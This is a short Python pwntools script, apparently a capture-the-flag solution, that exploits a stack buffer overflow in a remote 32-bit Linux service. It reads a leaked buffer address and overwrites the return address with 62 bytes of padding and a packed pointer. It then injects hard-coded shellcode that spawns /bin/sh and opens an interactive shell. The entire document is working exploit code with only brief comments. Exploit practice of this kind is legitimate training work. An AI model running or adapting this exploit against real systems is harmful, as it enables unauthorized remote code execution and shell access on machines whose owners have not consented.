#!/usr/bin/python
from pwn import *

#set context
context(arch='i386', os='linux', endian='little')

#server
HOST = ""
PORT = 1337

#connect...
r = remote(HOST, PORT)

#junk buffer
buf =  "A"*62

#If buf address given...
addr = r.recvlines(2)[1].split("name locate at ")[1]
print addr
addr = hex(int(addr, 16) + 0x42)
print "EIP + 66 bytes (62 for junk, 4 for eip:", addr

#pack EIP+10
buf += p32(int(addr, 16))

#shellcode
buf += "\x60\x31\xc0\x31\xd2\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x68\x2d\x63\x63\x63\x89\xe1\x52\xeb\x07\x51\x53\x89\xe1\xcd\x80\x61\xe8\xf4\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"
#send payload
r.sendline(buf)

#interact
r.interactive()

